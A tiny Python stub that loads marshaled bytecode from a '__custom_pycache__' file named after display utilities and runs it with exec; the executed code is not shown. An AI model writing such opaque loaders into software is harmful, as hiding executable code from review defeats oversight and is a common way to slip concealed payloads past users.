
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'display_utils_6f6136791fc5463d8d35abe9ff6c6036.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
